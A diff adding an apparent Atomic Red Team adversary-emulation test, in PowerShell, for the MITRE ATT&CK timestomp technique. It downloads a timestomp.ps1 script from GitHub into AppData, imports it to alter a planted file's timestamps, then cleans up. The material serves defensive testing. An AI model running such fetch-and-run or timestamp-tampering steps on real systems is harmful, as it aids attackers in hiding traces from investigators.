@@ -1,0 +1,17 @@
+#TechniqueName: Indicator Removal on Host: Timestomp
+#AtomicTestName: Windows - Timestomp a File
+#Description: Timestomp kxwn.lock.&&Successful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. &&[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)&
+#Language: ps1
+
+#get_prereq_commands
+Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1" -OutFile "$env:appdata\Microsoft\timestomp.ps1"
+
+
+#commands
+import-module $env:appdata\Microsoft\timestomp.ps1
+timestomp -dest "$env:appdata\Microsoft\kxwn.lock"
+
+
+#cleanup_commands
+Remove-Item $env:appdata\Microsoft\timestomp.ps1 -ErrorAction Ignore
+Remove-Item $env:appdata\Microsoft\kxwn.lock -ErrorAction Ignore
